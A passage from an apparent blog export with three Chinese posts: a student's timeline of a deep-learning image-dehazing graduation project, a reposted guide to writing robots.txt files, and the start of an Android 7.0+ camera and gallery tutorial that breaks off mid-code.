任务时间线"></a>2. 任务时间线</h2><p>其实我也记不清所有的时间线了，但是还是知道个大概。</p><p>个人基础：在深度学习领域上，个人最开始只懂点Python，所以就从这里出发讲讲学习的过程吧。</p><h3 id="2-1-深度学习起航-2月"><a href="#2-1-深度学习起航-2月" class="headerlink" title="2.1 深度学习起航-2月"></a>2.1 深度学习起航-2月</h3><p>1月份的大部分时间都集中在了<strong>毕业实习</strong>上,直到<strong>1/26日</strong>左右，从师兄那儿借了本《Tensorflow：实战Google深度学习框架》，就是下面这本书：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1IH..c8Kw3KVjSZTEq6AuRpXa7.jpg"></p><p>开始搭建深度学习TensorFlow开发环境。这分为了<strong>Win10</strong>上搭建和<strong>Ubuntu</strong>上搭建。</p><p>i&gt; 起初我是在Win10上搭建的，但后期怀疑Linux上能跑得更快，故后期又在Ubuntu搭建了深度学习环境。当然后期发现，<strong>Ubuntu上的GPU确实是比Win上高</strong>。搭建环境推荐博文：</p><p>[post url=”<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3VveWFvaHVhL3AvOTI2NTI2OC5odG1sJnF1b3Q7" title="https://www.cnblogs.com/guoyaohua/p/9265268.html&quot;">https://www.cnblogs.com/guoyaohua/p/9265268.html&quot;<i class="fa fa-external-link"></i></span> title=”Win10 Anaconda下TensorFlow-GPU环境搭建详细教程（包含CUDA+cuDNN安装过程）”/]</p><p>[post url=”<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTg2MzY4NS9hcnRpY2xlL2RldGFpbHMvODAzMDM5NjMmcXVvdDs=" title="https://blog.csdn.net/weixin_41863685/article/details/80303963&quot;">https://blog.csdn.net/weixin_41863685/article/details/80303963&quot;<i class="fa fa-external-link"></i></span> title=”Ubuntu18.04深度学习GPU环境配置” /]</p><p>之后在开学以前都是在学习《Tensorflow：实战Google深度学习框架》这本书，<strong>懒懒散散地到开学时大约还剩两章没看。</strong></p><p><strong>这段时间总结：</strong></p><p>√&gt;  1. 学会如何搭建TensorFlow的开发环境。2.学会深度学习中的部分理论，包括梯度下降回馈，卷积神经网络的相关理论，观看李宏毅老师的深度学习视频等等。</p><p>推荐几个学习CNN，深度学习的链接：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9wbGF5Z3JvdW5kLnRlbnNvcmZsb3cub3JnLw==" title="https://playground.tensorflow.org/">感知机可视化<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3Njcy5yeWVyc29uLmNhL35haGFybGV5L3Zpcy9jb252L2ZsYXQuaHRtbA==" title="http://scs.ryerson.ca/~aharley/vis/conv/flat.html">CNN可视化<i class="fa fa-external-link"></i></span>，以MNIST手写体识别为例，可视化整个CNN过程，可用于辅助理解卷积操作、卷积核、池化层等等。</li><li><span class="exturl" data-url="aHR0cHM6Ly91amp3YWxrYXJuLm1lLzIwMTYvMDgvMTEvaW50dWl0aXZlLWV4cGxhbmF0aW9uLWNvbnZuZXRzLw==" title="https://ujjwalkarn.me/2016/08/11/intuitive-explanation-convnets/">An Intuitive Explanation of Convolutional Neural Networks<i class="fa fa-external-link"></i></span> <strong>推荐</strong></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL2F2NTQzNDQ3MzE=" title="https://www.bilibili.com/video/av54344731">深度学习理论知识(李宏毅)<i class="fa fa-external-link"></i></span>，李宏毅老师的视频很多，涉及到的东西很宽，适合想全面入手深度学习的同学。</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL2F2MTYwMDE4OTE/ZnJvbT1zZWFyY2gmc2VpZD0xNDY5NDE4NTY4MzE1MzA5NDg5OQ==" title="https://www.bilibili.com/video/av16001891?from=search&seid=14694185683153094899">Tensorflow 搭建自己的神经网络 (莫烦 Python 教程)<i class="fa fa-external-link"></i></span></li></ul><h3 id="2-2-聚焦论文-3月"><a href="#2-2-聚焦论文-3月" class="headerlink" title="2.2 聚焦论文-3月"></a>2.2 聚焦论文-3月</h3><p>2月底开学了，在师兄的敦促下，发现自己的进度似乎过慢，毕竟这个时候也只是懂点CNN原理，tf的部分操作罢了。毕设的重点<strong>“图像去雾”</strong>完全没接触，于是在一边完成《实战Google深度学习框架》这本书的同时，开始刚近年的论文了。</p><p>3月初读完了那本书，大部分代码照着敲了一遍，然后整个月基本上是在读论文中渡过的，其实最开始读论文我是非常拒绝的(去你M的英文)，不过没办法，必须读下去啊。<strong>最开始读取的是一篇英文短期刊，发现里面的网络结构实在看不懂，什么跳跃连接，金字塔结构，书上根本没提到过，去雾的理论在一篇短期刊文章中也没办法读懂。</strong></p><p>读的第一篇文章:</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1rJFTdlaE3KVjSZLeq6xsSFXaz.jpg"></p><p>后来学聪明了，不从英文期刊中读，<strong>改到去读国内硕士毕业论文</strong>，这样的文章一是中文对我更友好，二是介绍更全面;弊端就是太长，读起来有些累，不过初入门多读点总是好的。</p><p>随着文章越读越多，是时候<strong>找个文献管理器</strong>了，曾经做数模时就用过的一个文献管理器再次排上用场–<strong>zotero</strong>。不知道给多少人安利过这款软件了，反正就是特别好用啦，不过是在加上一定的插件和坚果云备份的场景下。如果你有一个<strong>ipad</strong>的话，可以使用<strong>papership</strong>这款软件，通过<strong>坚果云和zotero的文献库同步</strong>，这样ipad上也可以读文献。</p><p>我读论文的习惯有两个：1.使用pdf批注工具。2.使用markdown进一步提炼内容，并添加到zotero文献库对象项中。如：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1YrF0dlGE3KVjSZFhq6AkaFXa2.jpg"></p><p>纪念一下毕设期间读过的论文，还是蛮有成就感的。</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1W4JQdoGF3KVjSZFoq6zmpFXaY.jpg"></p><p>文献是理解理论的重要依据，但是文献的弊端就是<strong>“将一个很简单的东西用各种术语复杂化”</strong>，所以更多的理解途径是带着对文献的迷惑去百度去谷歌，在别人的博文上找到答案。随着读的博文增多，如何去管理读过的博文呢？我又用了<strong>两个工具</strong>（其实是三个，其中一个废弃掉了）。</p><ul><li><p><em>印象笔记+印象笔记剪切插件（已废弃）</em></p></li><li><p>Diigo：Chrome插件，在网页上做笔记（类似于pdf做笔记），并转存到在线库中。这个插件其实是也不是重点，效果可见下图：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1_clRdhiH3KVjSZPfq6xBiVXah.jpg"></p></li></ul><p><img data-src="https://ae01.alicdn.com/kf/HTB18PJ.daSs3KVjSZPi763siVXae.png"></p><p>第一张图是在一个网站上做了高亮的操作，然后通过点击插件图标选择Library，可进入到曾经有过标注的库。当然这只是其中一个功能，pdf标注，截图等等，这个插件都是可以实现的。</p><ul><li><p><strong>OneNote+OneNote剪贴插件</strong>，强烈推荐。我是从印象笔记转到OneNote的，以前一直听有人说OneNote赛高来着，去百度了一波印象笔记和OneNote的区别，感觉也就那这样，但是又一次闲得蛋疼的去安装了OneNote并且系统的学习了一下后，个人觉得印象笔记弱爆了。那么OneNote如何去辅助我们读博文呢。</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1PgdSdfWG3KVjSZFPq6xaiXXao.jpg"></p><p><img data-src="https://ae01.alicdn.com/kf/HTB15QJRdf1H3KVjSZFBq6zSMXXa1.jpg"></p></li></ul><p>这里还看不出和印象笔记的区别，但是OneNote有太多好用的功能，最喜欢的是“<strong>停靠窗口“和”链接笔记“</strong>了。本节总结中我会给出OneNote的学习视频。</p><p>说了这么多工具的使用，似乎都跑题了。嘛，就算<a href="https://www.ravenxrz.ink/2019/05/03/over-the-years-i-have-used-the-best-software-pc-dry-chapter.html">干货推荐篇</a>的补充吧。</p><p><strong>这段时间总结：</strong></p><p>√&gt; 1. 完成实战框架这本书。2. 读了很多去雾领域的相关论文。3. 掌握了几个用于辅助学习的软件工具。</p><p>推荐工具和链接：</p><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuem90ZXJvLm9yZy8=" title="https://www.zotero.org/">Zetero<i class="fa fa-external-link"></i></span>,我安装过的插件列表，如何安装使用请自行百度了：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB13Lh6da5s3KVjSZFNq6AD3FXa6.jpg"></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL2F2NDgwNTY1MD9mcm9tPXNlYXJjaCZzZWlkPTEwNDQyMTQ3ODQwNjUyOTY5MTk5" title="https://www.bilibili.com/video/av4805650?from=search&seid=10442147840652969199">十课精通onenote 2016—onenote教程，靠谱学院，星月制作<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9rb3Blcm5pby5jb20v" title="https://kopernio.com/">kopernio–文献寻找插件<i class="fa fa-external-link"></i></span></p></li></ul><h3 id="2-3-论文复现-4月"><a href="#2-3-论文复现-4月" class="headerlink" title="2.3 论文复现-4月"></a>2.3 论文复现-4月</h3><p>3月读了较多论文，代码实现倒还没有多少，所以这个月主要是做代码实现的工作。再此之前，只学习过TensorFlow，不过感觉tf做起来还是有点繁琐，所以我在寻找有没有什么替代方案，实现起来简单高校的。于是就学习了<strong>Keras</strong>。Keras封装得更为高层，以函数式编程来实现神经网络相当方便。于是从简单的MLP到CNN，MNIST全部熟悉了一遍。然后又学习了<strong>自编码器、（条件）生成对抗网络</strong>的相关理论及Keras实现。至此，Keras基本上是掌握了。</p><p>约4月中上旬，准备着手做论文复现工作，按以下条件去选复现的：</p><ul><li>经典去雾算法，几乎每篇论文都会拿来做对比的，于是选中了DCP。</li><li>简单易实现且引用率比较高的，于是选中了MSCNN。</li><li>已有开源的代码，并且是以tf或Keras实现的，于是选中了《Single Image Haze Removal using a Generative Adversarial Network》。</li></ul><p>做复现工作首先要有<strong>训练数据集</strong>（当然DCP不是深度学习方法，不需要训练集，不过也需要测试集呀），所以做了以下工作：</p><ol><li>通过NYU数据集合成雾图。</li><li>直接引用了RESIDE数据集。</li></ol><p>数据集是第一步，有了数据集就准备复现了。通过参考博文、开源代码算是做完了这几篇复现工作吧。不过MSCNN的Keras版本我没至今没有训练出来，对比过作者提供的Matlab版本，发现除输入图片size不一样，其余参数全部一样，训练集都是一样的（但是我归一化resize处理）。</p><p>x&gt; 说一下为什么输入size不一致，因为MSCNN是全卷积网络，按道理是可以支持任何size的，Matlab基于操作来实现，所以可以支持任何size，但是keras不一样，它是基于层来实现的，必须要指定输入size，所以我才将训练集进行了归一化resize处理。</p><p>这个月还做了一个工作就是着手写毕设论文，因为师兄觉得我太慢了，于是就写了论文的前两章。</p><p>4月玩得还是蛮浪的，工作量不算大。</p><p>所有复现论文的代码都已经开源，地址将贴在本文文末。</p><p>收获如下：</p><p>√&gt;  1.学习了Keras，更容易实现网络。2.学习合成雾图原理，并作了自己的实现。下载网上提供的RESIZE的雾图数据集。3. 复现了DCP,MSCNN和GAN去雾。4. 完成毕设前两章。</p><p>推荐链接：</p><ol><li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2x1dHpyb2VkZXIvbmV0cm9u" title="https://github.com/lutzroeder/netron">Netron-Kears网络结构可视化工具<i class="fa fa-external-link"></i></span>,这个工具还是很有用的，经常用来看网络结构是否出错，复现时看是否和别人的网络结构一致。效果如下图：</p><p><img data-src="https://ae01.alicdn.com/kf/HTB1uBdYdf1H3KVjSZFHq6zKppXaG.jpg"></p></li></ol><h3 id="2-4-实现毕设中网络结构-5月"><a href="#2-4-实现毕设中网络结构-5月" class="headerlink" title="2.4 实现毕设中网络结构-5月"></a>2.4 实现毕设中网络结构-5月</h3><p>虽说完成了几个去雾网络结构，但是到底该如何去做自己的网络结构来去雾却是一点头绪都没有。因为要我去修改网络结构，我可以说是没有任何理论支撑，给我一张网络图去实现，那没问题。所以这个时候就求助师兄了，后来师兄给了一篇<strong>DeBlurGan</strong>的paper，这篇文章算是我的救星，虽然不是Dehaze的论文，但是把它迁移过来试试看。花了差不多大半天的时间，完成了迁移，没想到train起来效果相当好，跑完一个epoch就可以得到清晰的图像。最后跑完50个epoch大约花了8个小时。</p><p>迁移的代码也已开源，将在文末贴出开源地址。同时在之后会给出一篇文章专门阐述这个DeBlurGan，以及实现过程。</p><p>后期就是做测试了，包括复现的算法的主观客观测试，指标统计等。</p><p>完成了去雾实验，5月的后半段就全是在写论文了，约在5/26日，完成了所有论文，修订，查重等。</p><h3 id="2-5-终章-答辩-6月"><a href="#2-5-终章-答辩-6月" class="headerlink" title="2.5 终章-答辩-6月"></a>2.5 终章-答辩-6月</h3><p>完成了论文后，其实我已经飘了，玩了大概一个星期，端午的前一天突然被通知要预答辩，可是我连ppt都没做啊。于是又跑回学校去做ppt，准备材料。预答辩来得及，要修改的东西也蛮多的，所以飘的后果就是熬夜加班改东西。</p><p>最终，6月11日，完成了答辩。</p><p>6月17日，拿到了结果，only B+。 其实觉得自己应该还是能得A的，虽然5个月来中间也蛮浪的，但是也还算努力吧。嘛，反正过了就行。重要的是收获了很多嘛。</p><h2 id="3-结尾"><a href="#3-结尾" class="headerlink" title="3. 结尾"></a>3. 结尾</h2><p>从1月到6月，5月时间，体验了一把“课题”的感受，为未来的日子打打基础，收获了很多。也要感谢师兄5个月来的各种帮助。</p><p>最后，毕业快乐。</p><p>所有去雾代码的开源地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLWRlaGF6ZS13b3Jr" title="https://github.com/raven-dehaze-work">https://github.com/raven-dehaze-work<i class="fa fa-external-link"></i></span></p><p><img data-src="https://ae01.alicdn.com/kf/HTB1Uth2doCF3KVjSZJnq6znHFXag.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图像去雾 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>转载-SEO优化-如何书写Robots文件</title>
      <link href="/archives/3c0e07f4.html"/>
      <url>/archives/3c0e07f4.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>版权属于：Naiel<br>本文链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhlbnhzby5jb20vYXJjaGl2ZXMvMTUwLmh0bWw=" title="https://www.phenxso.com/archives/150.html">https://www.phenxso.com/archives/150.html<i class="fa fa-external-link"></i></span><br>转载时须注明出处及本声明</p></blockquote><h2 id="什么是robots-txt"><a href="#什么是robots-txt" class="headerlink" title="什么是robots.txt"></a>什么是robots.txt</h2><a id="more"></a><p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p><p><strong>简单说来它就是一个爬虫协议，用来引导爬虫如何访问你的网站。</strong></p><h2 id="robots-txt存放位置"><a href="#robots-txt存放位置" class="headerlink" title="robots.txt存放位置"></a>robots.txt存放位置</h2><p>robots.txt 只能放在网站的根目录下。<br>即： <span class="exturl" data-url="aHR0cDovL3d3dy5kb21haW4uY29tL3JvYm90cy50eHQ=" title="http://www.domain.com/robots.txt">http://www.domain.com/robots.txt<i class="fa fa-external-link"></i></span></p><h2 id="写一个robots-txt"><a href="#写一个robots-txt" class="headerlink" title="写一个robots.txt"></a>写一个robots.txt</h2><p>robots文件不存在或者为空，都代表着爬虫可以随意爬取本网站所有目录。</p><h2 id="User-agent"><a href="#User-agent" class="headerlink" title="User-agent:"></a>User-agent:</h2><p>User-agent:(爬虫名称)<br>通常为同一设置则写为 <code>User-agent: *</code><br>如需独立设置可以把 <code>*</code>换成对应的爬虫名称</p><p>常见搜索引擎爬虫名称 开合</p><h3 id="Google"><a href="#Google" class="headerlink" title="Google:"></a>Google:</h3><p>Googlebot：google网页爬虫<br>Googlebot-news：google新闻爬虫<br>Googlebot-image：google图片爬虫<br>Googlebot-video：google视频爬虫<br>Googlebot-mobile：google移动爬虫<br>Mediapartners-google或Mediapartners(googlebot)：google广告爬虫<br>Adsbot-google：google着陆页质量检测爬虫</p><h3 id="百度："><a href="#百度：" class="headerlink" title="百度："></a>百度：</h3><p>Baiduspider：百度网页爬虫兼移动爬虫<br>Baiduspider-image：百度图片爬虫<br>Baiduspider-video：百度视频爬虫<br>Baiduspider-news：百度新闻爬虫<br>Baiduspider-favo：百度搜藏爬虫<br>Baiduspider-cpro：百度联盟爬虫<br>Baiduspider-ads：百度商务爬虫</p><h3 id="好搜："><a href="#好搜：" class="headerlink" title="好搜："></a>好搜：</h3><p>360spider或haosouspider：好搜网页爬虫兼移动爬虫<br>360spider-image：好搜图片爬虫<br>360spider-video：好搜视频爬虫</p><h3 id="搜狗："><a href="#搜狗：" class="headerlink" title="搜狗："></a>搜狗：</h3><p>Sogou spider：搜狗综合爬虫</p><h3 id="新浪爱问"><a href="#新浪爱问" class="headerlink" title="新浪爱问"></a>新浪爱问</h3><p>Iaskspider：新浪爱问爬虫</p><h3 id="有道"><a href="#有道" class="headerlink" title="有道"></a>有道</h3><p>YodaoBot：网易有道爬虫</p><h3 id="Alexa"><a href="#Alexa" class="headerlink" title="Alexa"></a>Alexa</h3><p>ia_archiver：Alexa爬虫</p><h3 id="雅虎"><a href="#雅虎" class="headerlink" title="雅虎"></a>雅虎</h3><p>Yahoo! Slurp：雅虎爬虫</p><h3 id="必应"><a href="#必应" class="headerlink" title="必应"></a>必应</h3><p>Bingbot：必应爬虫</p><h2 id="Disallow"><a href="#Disallow" class="headerlink" title="Disallow:"></a>Disallow:</h2><p>Disallow:（路径、文件名）</p><p>表示不允许爬虫爬取匹配该路径、文件名的url。<br>robots.txt文件中，至少要有一条Disallow记录，否则文件失效。<br>但是要注意写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br></pre></td></tr></table></figure><blockquote><p>上面代表着允许所有爬虫爬取所有目录！</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;</span><br></pre></td></tr></table></figure><blockquote><p>上面代表着不允许所有爬虫爬取所有目录！</p></blockquote><p>一个<code>/</code>引起的灾难要注意</p><h2 id="Allow"><a href="#Allow" class="headerlink" title="Allow:"></a>Allow:</h2><p>Allow:（路径、文件名）<br>表示允许爬取的url信息。</p><h2 id="Sitemap网页地图"><a href="#Sitemap网页地图" class="headerlink" title="Sitemap网页地图"></a>Sitemap网页地图</h2><p>Sitemap其实它和robots.txt一样，也是是一种收录协议，可以说是robots.txt的一种扩展。<br>它有自己的语话和结构。<br>sitemap可以使用在线生成工具生成，也可以使用插件自动完成。介绍一个在线生成工具： xml-sitemaps</p><blockquote><p>sitemap文件一般也放在根目录，但不是必须。<br>robots.txt中引入sitemap文件时，必须用绝对路径，如： <span class="exturl" data-url="aHR0cDovL3d3dy5kb21pbi5jb20vc2l0ZW1hcC54bWw=" title="http://www.domin.com/sitemap.xml">http://www.domin.com/sitemap.xml<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="robots-txt通配符"><a href="#robots-txt通配符" class="headerlink" title="robots.txt通配符"></a>robots.txt通配符</h2><p>通配符 * 和 $ 和 #</p><p><code>*</code>： 任意字符。例如很长的url<code>https://wl.phenxso.com/uploads/big/2d57148bf5dd5e7f6cc2b4e39f1dacc6.png</code>，禁止爬虫爬取可以这样写<code>Disallow: /*/big*</code>，这样所有url内有<code>/big</code>这样的字符都不会被爬取。<br><code>$</code>： 匹配url的末端。例如不想爬虫爬取jpg图片，那么可以这样写 <code>Disallow: .jpg$</code><br><code>#</code>： 爬虫会忽略<code>#</code>后的所有字符，注释用</p><p>在一些robots.txt中可以看到有<code>?</code>这个符号，这个不是通配符。它的意义代表动态网页，例如：在robot。txt中写一条<code>Disallow: /*?*</code>。这代表着禁止爬取所有动态网页。</p><h2 id="书写规范"><a href="#书写规范" class="headerlink" title="书写规范"></a>书写规范</h2><ol><li>文件名<code>robots.txt</code>小写</li><li><code>User-agent、Disallow、Allow、Sitemap</code>后无空格跟英文冒号，冒号后接英文空格写路径、文件名</li><li><code>User-agent、Disallow、Allow、Sitemap</code>首字母大写</li><li>除了第三条说明的大写其他全部小写</li><li><code>Allow</code>写在<code>Disallow</code>之前</li><li>每一条顶头书写</li></ol><h2 id="通配符匹配"><a href="#通配符匹配" class="headerlink" title="通配符匹配"></a>通配符匹配</h2><p>每个爬虫的通配符匹配效果并不一样例如<br>下面有两个url、两种通配符写法、两种爬虫</p><p>url:<br><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhlbnhzby5jb20vYS92aWV3LnBocD9zaGFyZS9maWxlJnNpZD1QZG1LTXZ6" title="https://www.phenxso.com/a/view.php?share/file&sid=PdmKMvz">https://www.phenxso.com/a/view.php?share/file&amp;sid=PdmKMvz<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhlbnhzby5jb20vYS92aWV3LnBocD9zaGFyZS9maWxlUHJveHkmc2lkPVBkbUtNdno=" title="https://www.phenxso.com/a/view.php?share/fileProxy&sid=PdmKMvz">https://www.phenxso.com/a/view.php?share/fileProxy&amp;sid=PdmKMvz<i class="fa fa-external-link"></i></span></p><p>robots写法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;第一种</span><br><span class="line">Allow: &#x2F;*&#x2F;file*</span><br><span class="line">Disallow: &#x2F;*&#x2F;*Proxy*</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;第二种</span><br><span class="line">Allow: &#x2F;*&#x2F;*share&#x2F;*</span><br><span class="line">Disallow: &#x2F;*&#x2F;*Proxy*</span><br></pre></td></tr></table></figure><p>google爬虫第一种、第二种写法测试结果：<br>第一条url匹配，爬取成功<br>第二条url不匹配，爬取失败</p><p>百度爬虫第一种法测试结果：<br>第一条url匹配，爬取成功<br>第二条url不匹配，爬取失败</p><p>百度爬虫第二种法测试结果：<br>第一条url匹配，爬取成功<br>第二条url匹配，爬取成功</p><p>不同的爬虫算法不一样，在书写的时候可能需要做不同爬虫的测试。为爬虫写独立规则</p><p>不同爬虫不同规则书写方法，以下是例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: 爬虫名称</span><br><span class="line">Disallow: &#x2F;</span><br><span class="line"></span><br><span class="line">User-agent: 爬虫名称</span><br><span class="line">Disallow: &#x2F;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SEO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android7-0后相机相册调用</title>
      <link href="/archives/5528d718.html"/>
      <url>/archives/5528d718.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><blockquote><p>需求提出：之前在帮助别人做东西的时候有这样一个功能，相机拍照到一个<strong>固定的目录</strong>，相册选取图片（单选、多选）。</p></blockquote><p>Android6.0以后提出新的权限管理机制，7.0后相册访问机制也进一步更改。所以我们除了相机、相册功能外还要考虑权限问题。下面就稍微讲解一下如何实现这些功能。</p><p>先说明一点，本文所实现的代码没有兼容7.0以前，只实现了7.0之后的相关代码。</p><a id="more"></a><p><strong>相关知识：</strong></p><ol><li>相机、相册权限请求</li><li>相机、相册调用</li><li>相机拍照后将图片移动一个固定的文件夹下（文件IO操作）</li></ol><h2 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2. 代码实现"></a>2. 代码实现</h2><p>先来看一下实现的效果:</p><p><img data-src="https://puui.qpic.cn/fans_admin/0/3_203818224_1560341182603/0"></p><h3 id="2-1-材料准备"><a href="#2-1-材料准备" class="headerlink" title="2.1 材料准备"></a>2.1 材料准备</h3><p>为实现代码方便，这里引用两个开源库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;动态权限申请库</span><br><span class="line">implementation &#39;pub.devrel:easypermissions:1.3.0&#39;</span><br><span class="line">&#x2F;&#x2F; 多选相册(如果不实现多选，不用引用这个库，调用系统相册选择已经足够)</span><br><span class="line">implementation &#39;com.github.HuanTanSheng:EasyPhotos:2.4.4&#39;</span><br><span class="line">&#x2F;&#x2F; Glide 多选相册依赖，不用多选就不用添加下面两项</span><br><span class="line">implementation &#39;com.github.bumptech.glide:glide:4.4.0&#39;</span><br><span class="line">annotationProcessor &#39;com.github.bumptech.glide:compiler:4.4.0&#39;</span><br></pre></td></tr></table></figure><p>注意要引用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0h1YW5UYW5TaGVuZy9FYXN5UGhvdG9z" title="https://github.com/HuanTanSheng/EasyPhotos">EasyPhotos<i class="fa fa-external-link"></i></span>相关库，需要在项目的gradle文件下增添一个仓库地址<code>maven &#123; url &quot;https://jitpack.io&quot; &#125;</code>，最后的效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">allprojects &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">        maven &#123; url &quot;https:&#x2F;&#x2F;jitpack.io&quot; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-相关配置"><a href="#2-2-相关配置" class="headerlink" title="2.2 相关配置"></a>2.2 相关配置</h3><p>在manifest文件中添加权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 读写权限 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用相机权限 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.CAMERA&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>再在manifest文件的application标签中添加以下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:name</span>=<span class="string">&quot;android.support.v4.content.FileProvider&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:authorities</span>=<span class="string">&quot;com.raven.demo.fileprovider&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">           <span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">               <span class="attr">android:name</span>=<span class="string">&quot;android.support.FILE_PROVIDER_PATHS&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">android:resource</span>=<span class="string">&quot;@xml/file_paths&quot;</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意这里的<code>android:authorities=&quot;com.raven.demo.fileprovider&quot;</code>字段，需要将该字段中的<code>com.raven.demo</code>改为自己的包名。包名可在app模块的gradle文件中查看。</p><p>再在资源文件下建立file_paths.xml，如图：</p><p><img data-src="https://cy-pic.kuaizhan.com/g3/de/4b/6116-16ad-407a-a063-ccf4b45d8ce006"></p><p>添加以下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">paths</span> <span class="attr">xmlns:android</span>=<span 